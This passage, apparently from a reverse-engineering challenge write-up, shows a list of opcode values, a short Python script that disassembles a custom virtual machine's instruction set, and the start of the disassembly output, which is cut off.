class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0xF5E3C114</span>, <span class="hljs-number">0x0000000E</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x00000127</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000154</span>, <span class="hljs-number">0x0000000C</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x228EC216</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000013</span>, <span class="hljs-number">0x00000183</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x00000153</span>, <span class="hljs-number">0x0000000E</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x89D45A61</span>, <span class="hljs-number">0x0000000E</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x00000132</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000154</span>, <span class="hljs-number">0x0000000C</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x655B8F69</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000013</span>, <span class="hljs-number">0x00000183</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x00000153</span>, <span class="hljs-number">0x0000000E</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x2484A07A</span>, <span class="hljs-number">0x0000000E</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x0000013D</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000154</span>, <span class="hljs-number">0x0000000C</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0xD9E5E7F8</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000013</span>, <span class="hljs-number">0x00000183</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x00000153</span>, <span class="hljs-number">0x0000000E</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x3A441532</span>, <span class="hljs-number">0x0000000E</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x00000148</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000154</span>, <span class="hljs-number">0x0000000C</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x91AB7E88</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000013</span>, <span class="hljs-number">0x00000183</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x00000153</span>, <span class="hljs-number">0x0000000E</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x69FC64BC</span>, <span class="hljs-number">0x0000000E</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x007D3765</span>, <span class="hljs-number">0x0000000E</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000189</span>, <span class="hljs-number">0x0000000C</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000063</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x9E3779B9</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x00095C4C</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x0000871D</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x0001A7B7</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x0012C7C7</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x00000010</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000012</span>, <span class="hljs-number">0x00000020</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000013</span>, <span class="hljs-number">0x00000160</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x0000000A</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x0000000B</span>, <span class="hljs-number">0x00000020</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x0000000C</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x0000000A</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x0000000E</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x0000000F</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000012</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000010</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x0000000E</span>, <span class="hljs-number">0x0000000B</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x0000000F</span>, <span class="hljs-number">0x0000000B</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000010</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x0000000A</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x0000000E</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x0000000F</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000012</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000010</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x0000000E</span>, <span class="hljs-number">0x0000000B</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x0000000F</span>, <span class="hljs-number">0x0000000B</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000010</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x0000000B</span>, <span class="hljs-number">0x0000000C</span>, <span class="hljs-number">0x0000000E</span>, <span class="hljs-number">0x0000000B</span>, <span class="hljs-number">0x0000000A</span>, <span class="hljs-number">0x0000000C</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x0000006E</span>, <span class="hljs-number">0x00000062</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x0000006F</span>, <span class="hljs-number">0x00000062</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x0000000C</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000079</span>, <span class="hljs-number">0x00000062</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000065</span>, <span class="hljs-number">0x00000062</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000073</span>, <span class="hljs-number">0x00000062</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x0000000C</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x00000000</span>]</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(opcodes)//<span class="hljs-number">3</span>*<span class="hljs-number">3</span>)</span><br><span class="line">op = <span class="hljs-number">0</span></span><br><span class="line">arg1 = <span class="hljs-number">0</span></span><br><span class="line">arg2 = <span class="hljs-number">0</span></span><br><span class="line">arr = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>)]</span><br><span class="line">stack = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x3e8</span>)]</span><br><span class="line">i = <span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(opcodes):</span><br><span class="line">    op = opcodes[i]</span><br><span class="line">    arg1 = opcodes[i+<span class="hljs-number">1</span>]</span><br><span class="line">    arg2 = opcodes[i+<span class="hljs-number">2</span>]</span><br><span class="line">    match op:</span><br><span class="line">        case <span class="hljs-number">0</span>:</span><br><span class="line">            <span class="hljs-built_in">print</span>(i, <span class="hljs-string">"nop"</span>)</span><br><span class="line">        case <span class="hljs-number">1</span>:</span><br><span class="line">            <span class="hljs-built_in">print</span>(i, <span class="hljs-string">f"arr[<span class="hljs-subst">{arg1}</span>]=<span class="hljs-subst">{arg2}</span>"</span>)</span><br><span class="line">        case <span class="hljs-number">2</span>:</span><br><span class="line">            <span class="hljs-built_in">print</span>(i, <span class="hljs-string">f"arr[<span class="hljs-subst">{arg1}</span>]=arr[<span class="hljs-subst">{arg2}</span>]"</span>)</span><br><span class="line">        case <span class="hljs-number">3</span>:</span><br><span class="line">            <span class="hljs-built_in">print</span>(i, <span class="hljs-string">f"arr[<span class="hljs-subst">{arg1}</span>]=stack[<span class="hljs-subst">{arg2}</span>]"</span>)</span><br><span class="line">        case <span class="hljs-number">4</span>:</span><br><span class="line">            <span class="hljs-built_in">print</span>(i, <span class="hljs-string">f"stack[<span class="hljs-subst">{arg1}</span>]=arr[<span class="hljs-subst">{arg2}</span>]"</span>)</span><br><span class="line">        case <span class="hljs-number">5</span>:</span><br><span class="line">            <span class="hljs-built_in">print</span>(i, <span class="hljs-string">f"push arr[<span class="hljs-subst">{(arg2&lt;&lt;<span class="hljs-number">8</span>)+arg1}</span>]"</span>)</span><br><span class="line">        case <span class="hljs-number">6</span>:</span><br><span class="line">            <span class="hljs-built_in">print</span>(i, <span class="hljs-string">f"pop arr[<span class="hljs-subst">{(arg2&lt;&lt;<span class="hljs-number">8</span>)+arg1}</span>]"</span>)</span><br><span class="line">        case <span class="hljs-number">7</span>:</span><br><span class="line">            <span class="hljs-built_in">print</span>(i, <span class="hljs-string">f"arr[<span class="hljs-subst">{arg1}</span>]+=arr[<span class="hljs-subst">{arg2}</span>]"</span>)</span><br><span class="line">        case <span class="hljs-number">8</span>:</span><br><span class="line">            <span class="hljs-built_in">print</span>(i, <span class="hljs-string">f"arr[<span class="hljs-subst">{arg1}</span>]-=arr[<span class="hljs-subst">{arg2}</span>]"</span>)</span><br><span class="line">        case <span class="hljs-number">9</span>:</span><br><span class="line">            <span class="hljs-built_in">print</span>(i, <span class="hljs-string">f"arr[<span class="hljs-subst">{arg1}</span>]/=arr[<span class="hljs-subst">{arg2}</span>]"</span>)</span><br><span class="line">        case <span class="hljs-number">10</span>:</span><br><span class="line">            <span class="hljs-built_in">print</span>(i, <span class="hljs-string">f"arr[<span class="hljs-subst">{arg1}</span>]*=arr[<span class="hljs-subst">{arg2}</span>]"</span>)</span><br><span class="line">        case <span class="hljs-number">11</span>:</span><br><span class="line">            <span class="hljs-built_in">print</span>(i, <span class="hljs-string">f"arr[<span class="hljs-subst">{arg1}</span>]^=arr[<span class="hljs-subst">{arg2}</span>]"</span>)</span><br><span class="line">        case <span class="hljs-number">12</span>:</span><br><span class="line">            <span class="hljs-built_in">print</span>(i, <span class="hljs-string">f"jmp 3*arr[<span class="hljs-subst">{(arg2&lt;&lt;<span class="hljs-number">8</span>)+arg1}</span>]"</span>)</span><br><span class="line">        case <span class="hljs-number">13</span>:</span><br><span class="line">            <span class="hljs-built_in">print</span>(i, <span class="hljs-string">f"if arr[<span class="hljs-subst">{arg1}</span>]==arr[<span class="hljs-subst">{arg2}</span>]:\n  jmp 3*arr[19]"</span>)</span><br><span class="line">        case <span class="hljs-number">14</span>:</span><br><span class="line">            <span class="hljs-built_in">print</span>(i, <span class="hljs-string">f"if arr[<span class="hljs-subst">{arg1}</span>]!=arr[<span class="hljs-subst">{arg2}</span>]:\n  jmp 3*arr[19]"</span>)</span><br><span class="line">        case <span class="hljs-number">15</span>:</span><br><span class="line">            <span class="hljs-built_in">print</span>(i, <span class="hljs-string">f"if arr[<span class="hljs-subst">{arg1}</span>]&gt;arr[<span class="hljs-subst">{arg2}</span>]:\n  jmp 3*arr[19]"</span>)</span><br><span class="line">        case <span class="hljs-number">16</span>:</span><br><span class="line">            <span class="hljs-built_in">print</span>(i, <span class="hljs-string">f"if arr[<span class="hljs-subst">{arg1}</span>]&lt;arr[<span class="hljs-subst">{arg2}</span>]:\n  jmp 3*arr[19]"</span>)</span><br><span class="line">        case <span class="hljs-number">0x61</span>:</span><br><span class="line">            <span class="hljs-built_in">print</span>(i, <span class="hljs-string">f"arr[<span class="hljs-subst">{(arg2&lt;&lt;<span class="hljs-number">8</span>)+arg1}</span>]=getchar()"</span>)</span><br><span class="line">        case <span class="hljs-number">0x62</span>:</span><br><span class="line">            <span class="hljs-built_in">print</span>(i, <span class="hljs-string">f"putchar(arr[<span class="hljs-subst">{(arg2&lt;&lt;<span class="hljs-number">8</span>)+arg1}</span>])"</span>)</span><br><span class="line">        case <span class="hljs-number">0x63</span>:</span><br><span class="line">            <span class="hljs-built_in">print</span>(i, <span class="hljs-string">f"quitVM!"</span>)</span><br><span class="line">    i += <span class="hljs-number">3</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">0</span> nop</span><br><span class="line"><span class="hljs-attribute">3</span> nop</span><br><span class="line"><span class="hljs-attribute">6</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">87</span></span><br><span class="line"><span class="hljs-attribute">9</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">12</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">101</span></span><br><span class="line"><span class="hljs-attribute">15</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">18</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">108</span></span><br><span class="line"><span class="hljs-attribute">21</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">24</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">99</span></span><br><span class="line"><span class="hljs-attribute">27</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">30</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">111</span></span><br><span class="line"><span class="hljs-attribute">33</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">36</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">109</span></span><br><span class="line"><span class="hljs-attribute">39</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">42</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">101</span></span><br><span class="line"><span class="hljs-attribute">45</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">48</span> arr[<span class="hljs-number">0</span>]=<span 